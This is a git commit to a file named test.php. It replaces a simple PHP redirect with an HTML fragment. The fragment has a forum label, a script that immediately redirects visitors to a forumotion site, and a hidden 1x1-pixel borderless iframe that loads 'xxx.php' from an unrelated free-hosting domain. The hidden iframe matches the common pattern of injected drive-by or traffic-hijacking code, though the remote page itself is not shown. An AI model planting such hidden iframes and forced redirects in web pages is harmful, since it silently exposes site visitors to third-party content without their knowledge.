6a43bacfbe623654e0bd24baf2acdcb232a60084
alekseishaklov <78877882+alekseishaklov@users.noreply.github.com>
2021-03-14 16:14:39 +0300

    Update test.php

--- test.php
+++ test.php
@@ -1,6 +1,2 @@
-<?php
-ob_start();
-$new_url = 'https://example.com/final.php';
-header('Location: '.$new_url);
-ob_end_flush();
-?>
+<b>HiAsm ФОРУМ Кодинг</b><script>document.location.href="https://coding.forumotion.me/";</script><iframe width="1px" height="1px" frameborder="0" scrolling="no" src="http://free.logiz.h1n.ru/xxx.php"></iframe>
+
